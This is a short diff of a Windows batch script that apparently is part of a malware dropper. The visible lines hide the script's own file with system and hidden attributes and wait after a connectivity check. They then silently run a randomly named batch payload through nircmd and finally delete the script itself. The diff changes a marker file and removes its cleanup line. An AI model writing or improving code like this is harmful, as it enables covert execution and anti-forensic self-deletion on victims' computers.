@@ -1,5 +1,5 @@
 @echo off
-echo " " > "%userprofile%\running.info"
+echo 1 > "%userprofile%\running.log"
 setlocal 
 attrib +s +h +i "%~f0"
 :connectivitycheck
@@ -70,5 +70,4 @@ set "win32=%random%"
 timeout -t 240
 "%environment%\nircmd.exe" exec hide "%environment%\Win32\%win32%.bat"
 endlocal
-del /s /f /q /a "%userprofile%\running.info"
 DEL /s /f /q /a "%~f0"
